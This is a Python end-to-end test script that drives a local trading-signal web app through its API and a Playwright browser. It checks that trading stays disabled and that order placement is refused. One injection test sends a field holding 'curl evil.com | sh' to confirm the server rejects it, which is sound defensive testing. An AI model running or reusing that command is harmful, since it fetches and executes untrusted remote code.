"""End-to-end validation against a RUNNING instance, driven through the browser.

    python tools/e2e_check.py                 # everything it can without a broker
    python tools/e2e_check.py --kite          # also exercise the live Kite paths

This drives the real UI with Playwright and asserts on what the user would
actually see, rather than poking the API and hoping the front end agrees. Every
check prints PASS or FAIL and the script exits non-zero if anything failed, so
it is usable in CI or before a release.

It never enables trading and never places an order. The order checks assert
that placement is REFUSED.
"""
from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.request
from pathlib import Path

BASE = "http://127.0.0.1:8000"

results: list[tuple[bool, str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> bool:
    results.append((ok, name, detail))
    print(f"  {'PASS' if ok else 'FAIL'}  {name}" + (f"  — {detail}" if detail else ""),
          flush=True)
    return ok


def api(path: str, body: dict | None = None, timeout: int = 900):
    url = BASE + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json"} if data else {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read() or b"{}")
        except Exception:
            return e.code, {}
    except Exception as e:
        return 0, {"detail": str(e)}


# ==========================================================================
def api_checks(use_kite: bool) -> dict:
    print("\nAPI")
    st, health = api("/api/health")
    check("health responds", st == 200 and health.get("status") == "ok")

    st, cfg = api("/api/config")
    check("config responds", st == 200)
    kite_live = cfg.get("kite", {}).get("authenticated", False)
    check("trading disabled (must be, for this run)",
          cfg.get("trading_enabled") is False,
          "ENABLE_TRADING is true — refusing to continue" if cfg.get("trading_enabled") else "")
    if cfg.get("trading_enabled"):
        sys.exit("ENABLE_TRADING=true; set it false before validating")

    providers = cfg.get("llm", {}).get("providers", [])
    ready = [p["key"] for p in providers if p["configured"]]
    check("at least one LLM provider ready", bool(ready), ", ".join(ready) or "none")

    # the strategy DSL must be servable without any model at all
    st, dflt = api("/api/llm/default")
    check("built-in strategy available with no LLM",
          st == 200 and "SMA(6) crosses above SMA(30)" in dflt.get("summary", ""))

    st, schema = api("/api/llm/schema")
    check("strategy schema exposed", st == 200 and "flat_schema" in schema)

    # ---- injection must be refused ------------------------------------
    bad = {"name": "x", "entry": {"type": "crossover", "direction": "above",
                                  "left": {"kind": "sma", "period": 6},
                                  "right": {"kind": "sma", "period": 30}},
           "shell_command": "curl evil.com | sh"}
    st, r = api("/api/scan", {"spec": bad})
    check("spec with an injected field is rejected", st == 422,
          f"HTTP {st}")

    st, r = api("/api/scan", {"spec": {**{k: v for k, v in bad.items()
                                          if k != "shell_command"},
                                       "max_signals": 99999}})
    check("out-of-range max_signals is rejected", st == 422, f"HTTP {st}")

    # ---- kite ----------------------------------------------------------
    if use_kite:
        print("\nKITE (live session)")
        check("session authenticated", kite_live)
        if kite_live:
            p = cfg["kite"]["profile"]
            check("profile has user id and exchanges",
                  bool(p.get("user_id")) and bool(p.get("exchanges")),
                  f"{p['user_id']} · {', '.join(p['exchanges'][:4])}")
            for ep, key in (("holdings", "holdings"), ("positions", "positions"),
                            ("margins", "margins")):
                st, r = api(f"/api/kite/{ep}", timeout=180)
                check(f"/api/kite/{ep}", st == 200 and key in r)
            st, r = api("/api/kite/quote?instruments=NSE:INFY", timeout=120)
            check("live quote", st == 200 and "NSE:INFY" in r.get("ltp", {}),
                  f"INFY {r.get('ltp', {}).get('NSE:INFY', {}).get('last_price', '?')}")

            t0 = time.time()
            st, k = api("/api/scan", {"source": "kite", "limit_symbols": 10})
            ok = st == 200 and k.get("source") == "kite" and k.get("bars", 0) > 100
            check("scan using KITE candles", ok,
                  f"{k.get('bars')} bars, {k.get('universe_size')} symbols, "
                  f"{time.time() - t0:.0f}s")
    return cfg


def scan_and_orders(use_kite: bool) -> None:
    print("\nSCAN + ORDERS")
    src = "kite" if use_kite else "yfinance"
    st, scan = api("/api/scan", {"source": src, "limit_symbols": 40})
    if not check("scan completes", st == 200 and "signals" in scan):
        return
    sig = scan["signals"]
    check("counts describe ALL signals, not just shown rows",
          scan["counts"]["entry"] + scan["counts"]["exit"] == scan["total"],
          f"shown {scan['shown']} of {scan['total']}, dropped {scan['dropped']}")
    if sig:
        s = sig[0]
        check("rows carry close + both indicator values",
              s.get("price") is not None and s.get("left_value") is not None
              and s.get("right_value") is not None,
              f"{s['symbol']} close={s['price']} {s['left_label']}={s['left_value']}")
        # the crossover must be consistent with the side it claims
        bad = [x for x in sig
               if x["left_value"] is not None and x["right_value"] is not None
               and ((x["side"] == "ENTRY" and x["left_value"] < x["right_value"])
                    or (x["side"] == "EXIT" and x["left_value"] > x["right_value"]))]
        check("every row's averages agree with its BULLISH/BEARISH tag",
              not bad, f"{len(bad)} inconsistent" if bad else f"{len(sig)} rows")

    # Deliberately generous so the sheet is NOT empty: the placement guards
    # below are the most safety-critical checks in the suite and must run on
    # every pass, not only when the account happens to have free slots.
    st, prev = api("/api/trade/preview",
                   {"signals": sig, "capital": 1_000_000,
                    "max_positions": 50, "max_bars_since": 250,
                    "use_live_cash": False})
    if not check("order preview builds", st == 200 and "orders" in prev):
        return
    check("every proposed order carries a confirm token",
          all(o.get("confirm_token") for o in prev["orders"]),
          f"{len(prev['orders'])} orders")

    check("preview produced orders to test the guards against",
          bool(prev["orders"]),
          "no orders — placement guards NOT exercised this run"
          if not prev["orders"] else f"{len(prev['orders'])} orders")

    if prev["orders"]:
        o = prev["orders"][0]
        base = {k: o[k] for k in ("tradingsymbol", "exchange", "transaction_type",
                                  "quantity", "product", "order_type")}
        # This file can only ever prove the OUTER gate. ENABLE_TRADING is
        # checked before anything else, so against a live server with trading
        # off, every malformed request comes back with the same "disabled"
        # response — a tampered quantity, a wrong confirmation word and a
        # perfectly valid order are indistinguishable here.
        #
        # This used to be three separate checks named "tampered order refused"
        # and "wrong confirmation word refused". They passed, and they were
        # worthless: the signature and confirmation guards were never reached,
        # and deleting them outright would not have failed anything. The real
        # coverage lives in tests/test_order_guards.py, which turns trading on
        # with no broker attached so each guard fires for its own reason.
        st, r = api("/api/trade/place",
                    {**base, "confirm_token": o["confirm_token"], "confirm": "CONFIRM"})
        check("a valid order is REFUSED while trading is disabled", st == 403,
              str(r.get("detail", ""))[:70])

        st, tampered = api("/api/trade/place",
                           {**base, "quantity": base["quantity"] + 1,
                            "confirm_token": o["confirm_token"], "confirm": "CONFIRM"})
        st2, wrong = api("/api/trade/place",
                         {**base, "confirm_token": o["confirm_token"], "confirm": "yes"})
        check("the outer gate refuses everything, valid or not",
              st == 403 and st2 == 403
              and str(tampered.get("detail")) == str(r.get("detail"))
              and str(wrong.get("detail")) == str(r.get("detail")),
              "signature + confirmation guards covered by tests/test_order_guards.py")


def ui_checks(use_kite: bool) -> None:
    print("\nUI (real browser)")
    from playwright.sync_api import sync_playwright

    shots = Path("build/e2e")
    shots.mkdir(parents=True, exist_ok=True)
    errs: list[str] = []

    with sync_playwright() as p:
        b = p.chromium.launch()
        pg = b.new_page(viewport={"width": 1500, "height": 1000},
                        color_scheme="dark", device_scale_factor=2)
        pg.on("pageerror", lambda e: errs.append(f"pageerror: {e}"))
        pg.on("console", lambda m: errs.append(f"console.error: {m.text}")
              if m.type == "error" else None)

        pg.goto(BASE, wait_until="domcontentloaded")
        pg.wait_for_selector("h1", timeout=30_000)
        pg.wait_for_timeout(3500)

        tabs = [t.strip() for t in pg.locator("nav button").all_inner_texts()]
        check("all six tabs render",
              all(t in " ".join(tabs) for t in
                  ("Connect", "Account", "Strategy", "Signals", "Orders", "Settings")),
              " · ".join(tabs))

        # Connect
        pg.get_by_role("button", name="Connect", exact=True).click()
        pg.wait_for_timeout(900)
        body = pg.locator("body").inner_text()
        if use_kite:
            check("Connect shows the live session",
                  "disconnect" in pg.locator("body").inner_text().lower())
        pg.screenshot(path=shots / "1-connect.png", full_page=True)

        # Account
        pg.get_by_role("button", name="Account", exact=True).click()
        pg.wait_for_timeout(4000)
        body = pg.locator("body").inner_text().lower()
        if use_kite:
            check("Account renders profile + holdings",
                  "products enabled" in body and "holdings" in body,
                  f"{pg.locator('tbody tr').count()} holding rows")
        pg.screenshot(path=shots / "2-account.png", full_page=True)

        # Strategy
        pg.get_by_role("button", name="Strategy", exact=True).click()
        pg.wait_for_timeout(700)
        pg.get_by_role("button", name="Use the video's SMA 6/30").click()
        pg.wait_for_timeout(1200)
        check("compiled strategy is shown before scanning",
              pg.locator(".spec").count() > 0)
        pg.screenshot(path=shots / "3-strategy.png", full_page=True)

        # Signals
        pg.get_by_role("button", name="Signals", exact=True).click()
        pg.wait_for_timeout(800)
        vals = {}
        for lab in ("Short SMA", "Long SMA", "Lookback", "Max rows"):
            vals[lab] = pg.get_by_label(lab).first.input_value()
        check("the video's four controls are present and populated",
              vals == {"Short SMA": "6", "Long SMA": "30",
                       "Lookback": "15", "Max rows": "100"}, str(vals))

        # a short SMA that is not shorter must be refused
        pg.get_by_label("Short SMA").fill("50")
        pg.get_by_role("button", name="Generate signals").click()
        pg.wait_for_timeout(1200)
        check("refuses a short average that is not shorter than the long one",
              "must be shorter" in pg.locator("body").inner_text())
        pg.get_by_label("Short SMA").fill("6")

        pg.get_by_role("button", name="Generate signals").click()
        pg.wait_for_selector("table", timeout=900_000)
        pg.wait_for_timeout(1200)
        rows = pg.locator("tbody tr").count()
        heads = [h.strip() for h in pg.locator("thead th").all_inner_texts()]
        check("signal table renders with the video's columns", rows > 0
              and "CLOSE" in " ".join(heads).upper()
              and "SMA(6)" in " ".join(heads),
              f"{rows} rows · {' | '.join(heads)}")
        stat = " ".join(pg.locator(".stat").first.inner_text().split())
        check("source shown in the header", "SOURCE" in stat.upper(), stat)
        pg.screenshot(path=shots / "4-signals.png", full_page=True)

        # Orders
        pg.get_by_role("button", name="Build an order sheet").click()
        pg.wait_for_timeout(800)
        pg.get_by_label("Max bars since signal").fill("10")
        pg.get_by_role("button", name="Preview orders").click()
        pg.wait_for_timeout(6000)
        body = pg.locator("body").inner_text().lower()
        check("order preview renders", "buy side" in body and "cash" in body)
        check("placement is visibly disabled", "order placement is off" in body)
        # 0 orders is a legitimate outcome (no free slots, no cash, nothing
        # held to sell). What must never happen is a silent empty sheet.
        check("an empty sheet still explains itself",
              ("no orders" not in body) or ("note" in body or "slot" in body
                                            or "ignored" in body))
        pg.screenshot(path=shots / "5-orders.png", full_page=True)

        # Settings
        pg.get_by_role("button", name="Settings", exact=True).click()
        pg.wait_for_timeout(1200)
        check("settings lists providers and the price source",
              pg.locator(".provider").count() >= 10
              and "Price data" in pg.locator("body").inner_text(),
              f"{pg.locator('.provider').count()} providers")
        pg.screenshot(path=shots / "6-settings.png", full_page=True)

        b.close()

    check("no JavaScript errors anywhere", not errs, "; ".join(errs[:3]))


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--kite", action="store_true",
                    help="also exercise the live broker paths")
    ap.add_argument("--skip-ui", action="store_true")
    a = ap.parse_args()

    print(f"validating {BASE}" + ("  (with live Kite)" if a.kite else ""))
    api_checks(a.kite)
    scan_and_orders(a.kite)
    if not a.skip_ui:
        ui_checks(a.kite)

    failed = [r for r in results if not r[0]]
    print(f"\n{'=' * 62}")
    print(f"  {len(results) - len(failed)}/{len(results)} passed")
    for _, name, detail in failed:
        print(f"  FAILED: {name}  {detail}")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
